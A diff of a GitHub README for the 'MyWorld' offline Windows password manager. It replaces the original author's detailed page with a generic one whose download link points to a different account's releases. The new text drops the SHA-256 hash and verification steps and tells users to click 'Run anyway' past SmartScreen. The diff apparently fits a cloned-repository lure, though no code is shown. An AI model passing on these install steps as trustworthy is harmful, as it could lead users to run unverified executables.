@@ -1,383 +1,165 @@
-<p align="center">
-  <img src="assets/social-preview.png" alt="MyWorld - Secure, Fast & Offline Password Manager" width="100%">
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows" alt="Windows">
-  <img src="https://img.shields.io/badge/Encryption-AES--256-green?style=for-the-badge" alt="AES-256">
-  <img src="https://img.shields.io/badge/Storage-100%25%20Offline-purple?style=for-the-badge" alt="Offline">
-  <img src="https://img.shields.io/badge/Telemetry-None-red?style=for-the-badge" alt="No Telemetry">
-</p>
-
-<p align="center">
-  <a href="https://github.com/moner-dev/MyWorld-Password-Manager/releases/latest">
-    <img src="https://img.shields.io/github/v/release/moner-dev/MyWorld-Password-Manager?style=for-the-badge&color=5865F2&label=Version" alt="Latest Release">
-  </a>
-  <a href="https://github.com/moner-dev/MyWorld-Password-Manager/releases">
-    <img src="https://img.shields.io/github/downloads/moner-dev/MyWorld-Password-Manager/total?style=for-the-badge&color=5865F2" alt="Downloads">
-  </a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/github/license/moner-dev/MyWorld-Password-Manager?style=for-the-badge&color=5865F2" alt="License">
-  </a>
-  <a href="https://github.com/moner-dev/MyWorld-Password-Manager/stargazers">
-    <img src="https://img.shields.io/github/stars/moner-dev/MyWorld-Password-Manager?style=for-the-badge&color=5865F2" alt="Stars">
-  </a>
-</p>
-
-<p align="center">
-  <a href="#-features">Features</a> &nbsp;•&nbsp;
-  <a href="#-screenshots">Screenshots</a> &nbsp;•&nbsp;
-  <a href="#-download">Download</a> &nbsp;•&nbsp;
-  <a href="#-keyboard-shortcuts">Shortcuts</a> &nbsp;•&nbsp;
-  <a href="#-security">Security</a>
-</p>
-
----
-
-## Why MyWorld?
-
-> Still using the same password everywhere? Storing passwords in a text file? Forgetting credentials constantly?
-
-**MyWorld** is a secure, offline password vault that keeps all your credentials encrypted and organized. No cloud, no subscriptions, no data collection — your passwords stay on your device, protected by military-grade encryption.
-
----
-
-## ✨ Features
-
-<table>
-<tr>
-<td width="50%" valign="top">
-
-### 🔐 Security First
-
-| Feature | Description |
-|---------|-------------|
-| **AES-256-GCM** | Military-grade authenticated encryption |
-| **PBKDF2** | 100,000+ iterations key derivation |
-| **Auto-Lock** | Automatic vault locking after inactivity |
-| **Memory Guard** | Sensitive data cleared from RAM |
-| **Zero Knowledge** | Master password never stored |
-
-</td>
-<td width="50%" valign="top">
-
-### 📁 Organization
-
-| Feature | Description |
-|---------|-------------|
-| **Categories** | Social, Banking, Work, Custom |
-| **Tags** | Flexible labeling system |
-| **Favorites** | Quick access pinning |
-| **Smart Search** | Instant filtering |
-| **Notes** | Secure attached notes |
+# 🔐 MyWorld-Password-Manager - Secure Offline Password Vault
 
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
+[![Download MyWorld Password Manager](https://img.shields.io/badge/Download-MyWorld%20Password%20Manager-blue?style=for-the-badge)](https://github.com/Kantar4109/MyWorld-Password-Manager/releases)
 
-### 🔑 Password Tools
+## 🧭 Overview
 
-| Feature | Description |
-|---------|-------------|
-| **Generator** | 8-128 character passwords |
-| **Strength Meter** | Visual security indicator |
-| **Duplicate Check** | Find reused passwords |
-| **Breach Check** | Verify against known leaks |
-| **History** | Password change tracking |
+MyWorld Password Manager keeps your passwords on your device, not in the cloud. It stores your logins in an encrypted vault and helps you keep them in one place.
 
-</td>
-<td width="50%" valign="top">
+Use it to save website passwords, app logins, notes, and other private details. It runs offline on Windows, so your data stays on your computer.
 
-### 💾 Data Management
+## 🚀 Download and Install
 
-| Feature | Description |
-|---------|-------------|
-| **Backup** | Encrypted vault export |
-| **Import** | Migrate from other apps |
-| **Clipboard** | Auto-clear after copy |
-| **Offline** | No internet required |
-| **Portable** | Optional portable mode |
+Visit this page to download:
+https://github.com/Kantar4109/MyWorld-Password-Manager/releases
 
-</td>
-</tr>
-</table>
+1. Open the link in your browser.
+2. Find the latest release.
+3. Download the Windows file for your device.
+4. Open the downloaded file.
+5. Follow the on-screen steps to install or launch the app.
 
----
+If Windows asks whether you want to run the file, choose Run or More info > Run anyway if you trust the source and downloaded it from the release page above.
 
-## 📸 Screenshots
+## 🖥️ Windows Requirements
 
-<p align="center">
-  <img src="bg/App/App-form1.png" alt="Main Screen" width="800">
-</p>
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- About 200 MB of free disk space
+- A mouse and keyboard
+- Internet access only to download the app
 
-<details>
-<summary><strong>View More Screenshots</strong></summary>
-<br>
+## 🔒 Key Features
 
-<p align="center">
-  <img src="bg/App/App-form2.png" alt="Screen 2" width="800">
-</p>
+- Local encrypted vault for passwords
+- AES-256 encryption for stored data
+- Offline use after download
+- Easy folder-free setup
+- Built for personal password storage
+- Works without a cloud account
+- Keeps passwords organized by site or app
+- Stores private notes with your logins
 
-<p align="center">
-  <img src="bg/App/App-form3.png" alt="Screen 3" width="800">
-</p>
+## 📦 What You Can Store
 
-<p align="center">
-  <img src="bg/App/App-form4.png" alt="Screen 4" width="800">
-</p>
+- Website usernames and passwords
+- Email account details
+- App login details
+- Security notes
+- Recovery codes
+- Private references you want to keep in one place
 
-</details>
+## 🛠️ First-Time Setup
 
----
+1. Open MyWorld Password Manager.
+2. Create a master password.
+3. Keep this password safe. It unlocks your vault.
+4. Add your first login entry.
+5. Save your changes.
+6. Close the app when you are done.
 
-## 📥 Download
+Use a master password that is long and easy for you to remember but hard for others to guess. A passphrase works well.
 
-<p align="center">
-  <a href="https://github.com/moner-dev/MyWorld-Password-Manager/releases/latest">
-    <img src="https://img.shields.io/badge/Download-Latest%20Release-5865F2?style=for-the-badge&logo=windows" alt="Download">
-  </a>
-</p>
+## 📁 How the Vault Works
 
-### Latest Release: v2.0.0
+The app keeps your data in an encrypted file on your Windows device. When you open the app, you enter your master password to unlock the vault.
 
-| File | Size | Description |
-|------|------|-------------|
-| [**MyWorld_Setup_2.0.0.exe**](https://github.com/moner-dev/MyWorld-Password-Manager/releases/download/v2.0.0/MyWorld_Setup_2.0.0.exe) | ~30 MB | Windows Installer (Recommended) |
+Your entries stay private unless someone has access to your device and your master password. If you back up the vault file, keep the backup in a safe place.
 
-### System Requirements
+## 🔑 Adding a Password Entry
 
-| Component | Requirement |
-|-----------|-------------|
-| **OS** | Windows 10 / 11 (64-bit) |
-| **RAM** | 4 GB minimum |
-| **Storage** | 100 MB free space |
-| **Internet** | Not required |
+1. Open the app.
+2. Choose Add Entry.
+3. Enter the site or app name.
+4. Add your username.
+5. Paste or type your password.
+6. Add any notes you want.
+7. Save the entry.
 
-### Verify Download (SHA-256)
+You can repeat these steps for each account you want to store.
 
-```
-bc57b11c907ef3a9096e2a1c2db25e94857b96b56ee5c9e907147b3239c818d0
-```
+## 👀 Viewing and Using Saved Passwords
 
-**Verify in PowerShell:**
-```powershell
-(Get-FileHash -Algorithm SHA256 .\MyWorld_Setup_2.0.0.exe).Hash
-```
+1. Open your vault.
+2. Search for the site or app name.
+3. Select the entry.
+4. Copy the username or password when you need it.
+5. Paste it into the sign-in form.
 
----
+This helps you avoid keeping passwords in browser notes, text files, or paper lists.
 
-## ⚠️ Windows SmartScreen Warning
+## 🗂️ Organizing Your Vault
 
-When you run the installer, Windows may show a **"Windows protected your PC"** warning. This is normal for independent software that isn't signed with a paid code signing certificate.
+Keep your vault easy to use by grouping entries in a simple way:
 
-<details>
-<summary><strong>Why does this happen?</strong></summary>
-<br>
+- Email
+- Banking
+- Shopping
+- Work
+- Social
+- Devices
+- Notes
 
-MyWorld is an **independent, open-source project**. Code signing certificates cost $300-600/year, which is not feasible for a free application. This warning does **NOT** mean the software is dangerous — it simply means Windows doesn't recognize the publisher.
+Short names make searches faster and help you find what you need.
 
-**MyWorld is safe because:**
-- Source architecture is documented
-- SHA-256 hash provided for verification
-- Ed25519 signed updates
-- No network connections (fully offline)
-- No data collection or telemetry
+## 💾 Back Up Your Vault
 
-</details>
+Back up your vault file from time to time so you do not lose your passwords if your PC stops working.
 
-### How to Install Anyway
+Suggested backup steps:
 
-| Step | Action |
-|:----:|--------|
-| 1 | Click **"More info"** on the SmartScreen popup |
-| 2 | Click **"Run anyway"** button that appears |
-| 3 | Continue with installation |
+1. Close the app.
+2. Copy the vault file to a USB drive or backup folder.
+3. Store the backup in a safe place.
+4. Update the backup after you add new entries.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Tip-Verify%20SHA--256%20hash%20before%20installing-yellow?style=flat-square" alt="Tip">
-</p>
+Keep backup copies protected the same way as the original vault.
 
----
+## 🧹 Tips for Safe Use
 
-## 🚀 Installation
+- Use one strong master password
+- Do not share your vault file with others
+- Lock your PC when you step away
+- Keep Windows up to date
+- Avoid saving your master password in plain text
+- Make regular backups
 
-```
-1. Download    →  MyWorld_Setup_2.0.0.exe
-2. Verify      →  Check SHA-256 hash (optional but recommended)
-3. Run         →  Click "More info" → "Run anyway" if SmartScreen appears
-4. Install     →  Follow the wizard
-5. Launch      →  Desktop shortcut or Start menu
-```
+## 🧩 Common Uses
 
-### First Launch
+- Save personal website logins
+- Keep work passwords separate from home passwords
+- Store recovery details for account setup
+- Hold private notes with account info
+- Replace weak password lists with one protected vault
 
-1. **Create Master Password** — This is the only password you'll remember
-2. **Set Security Options** — Auto-lock timeout, clipboard settings
-3. **Start Adding Entries** — Your vault is ready
+## 📌 File and Data Notes
 
----
+The app is designed for offline use on Windows. It does not depend on cloud sync, so you keep control of your data on your own device.
 
-## ⌨️ Keyboard Shortcuts
+If you move the app to another PC, you can move your vault file too. Open the app on the new machine and unlock it with your master password.
 
-### General
+## 🆘 If the App Does Not Open
 
-| Shortcut | Action |
-|:--------:|--------|
-| `Ctrl + N` | Create new entry |
-| `Ctrl + E` | Edit selected entry |
-| `Ctrl + D` | Delete selected entry |
-| `Ctrl + F` | Focus search bar |
-| `Ctrl + L` | Lock vault |
-| `Ctrl + Q` | Quit application |
-| `F1` | Open help |
-| `F5` | Refresh vault |
-| `Escape` | Clear search / Close dialog |
+Try these steps:
 
-### Clipboard Operations
+1. Download the file again from the release page.
+2. Make sure the download finished.
+3. Check that Windows did not block the file.
+4. Run the app as an administrator.
+5. Restart your PC and try again.
+6. Use the newest release from the download page.
 
-| Shortcut | Action |
-|:--------:|--------|
-| `Ctrl + B` | Copy password |
-| `Ctrl + U` | Copy username |
-| `Ctrl + Shift + U` | Copy URL |
-| `Ctrl + Shift + C` | Clear clipboard |
+## 🧭 Simple Start Guide
 
-### Navigation
+1. Download MyWorld Password Manager from the release page.
+2. Open the file on your Windows PC.
+3. Create your master password.
+4. Add your first login.
+5. Back up your vault file.
+6. Keep using it for new passwords
 
-| Shortcut | Action |
-|:--------:|--------|
-| `Ctrl + 1` | Go to All Items |
-| `Ctrl + 2` | Go to Favorites |
-| `Ctrl + 3` | Go to Categories |
-| `Ctrl + Tab` | Next category |
-| `Ctrl + Shift + Tab` | Previous category |
-| `↑ / ↓` | Navigate entries |
-| `Enter` | Open selected entry |
+## 📄 Project Details
 
-### Entry Management
+Repository: MyWorld-Password-Manager
 
-| Shortcut | Action |
-|:--------:|--------|
-| `Ctrl + G` | Generate password |
-| `Ctrl + S` | Save entry |
-| `Ctrl + Shift + F` | Toggle favorite |
-| `Ctrl + Shift + D` | Duplicate entry |
-
-### View Options
-
-| Shortcut | Action |
-|:--------:|--------|
-| `Ctrl + +` | Zoom in |
-| `Ctrl + -` | Zoom out |
-| `Ctrl + 0` | Reset zoom |
-| `Ctrl + Shift + T` | Toggle theme |
-
----
-
-## 🔧 Password Generator
-
-| Option | Range | Default |
-|--------|-------|---------|
-| **Length** | 8 - 128 characters | 16 |
-| **Uppercase** | A - Z | Enabled |
-| **Lowercase** | a - z | Enabled |
-| **Numbers** | 0 - 9 | Enabled |
-| **Symbols** | `!@#$%^&*()_+-=[]{}` | Enabled |
-| **Ambiguous** | `0O1lI` | Excluded |
-
-### Strength Indicators
-
-| Level | Description | Characters |
-|-------|-------------|------------|
-| 🔴 **Weak** | Easily guessable | < 8 |
-| 🟠 **Fair** | Basic protection | 8 - 11 |
-| 🟡 **Good** | Reasonable security | 12 - 15 |
-| 🟢 **Strong** | Recommended | 16 - 23 |
-| 🔵 **Excellent** | Maximum security | 24+ |
-
----
-
-## 🔒 Security
-
-<table>
-<tr>
-<td width="50%">
-
-### Encryption Stack
-
-| Layer | Technology |
-|-------|------------|
-| **Data Encryption** | AES-256-GCM |
-| **Key Derivation** | PBKDF2-SHA256 |
-| **Iterations** | 100,000+ |
-| **Salt** | Unique per vault |
-| **Updates** | Ed25519 signed |
-
-</td>
-<td width="50%">
-
-### Privacy Guarantees
-
-| Promise | Status |
-|---------|--------|
-| No cloud storage | ✅ |
-| No account required | ✅ |
-| No telemetry | ✅ |
-| No analytics | ✅ |
-| No data collection | ✅ |
-| Offline operation | ✅ |
-
-</td>
-</tr>
-</table>
-
-> For vulnerability reporting, see [SECURITY.md](SECURITY.md)
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License** — see [LICENSE](LICENSE) for details.
-
----
-
-## 👤 Author
-
-<table>
-<tr>
-<td>
-
-**MONER INTELLIGENCE SYSTEMS**
-
-[![GitHub](https://img.shields.io/badge/GitHub-moner--dev-181717?style=flat-square&logo=github)](https://github.com/moner-dev)
-[![Email](https://img.shields.io/badge/Email-moner.intelligence%40gmail.com-EA4335?style=flat-square&logo=gmail)](mailto:moner.intelligence@gmail.com)
-
-</td>
-</tr>
-</table>
-
----
-
-## ⭐ Support
-
-If you find MyWorld useful:
-
-| Action | Link |
-|--------|------|
-| ⭐ **Star** | [Star this repository](https://github.com/moner-dev/MyWorld-Password-Manager/stargazers) |
-| 🐛 **Report Bug** | [Open an issue](https://github.com/moner-dev/MyWorld-Password-Manager/issues) |
-| 💡 **Request Feature** | [Open an issue](https://github.com/moner-dev/MyWorld-Password-Manager/issues) |
-| 💬 **Discuss** | [GitHub Discussions](https://github.com/moner-dev/MyWorld-Password-Manager/discussions) |
-
----
-
-<p align="center">
-  <strong>Made with care for privacy-conscious users</strong>
-</p>
-
-<p align="center">
-  <a href="https://github.com/moner-dev/MyWorld-Password-Manager">
-    <img src="https://img.shields.io/badge/MyWorld-Password%20Manager-5865F2?style=for-the-badge" alt="MyWorld">
-  </a>
-</p>
+Topics: aes-256, desktop-app, encryption, offline, password-manager, privacy, python, security, vault, windows
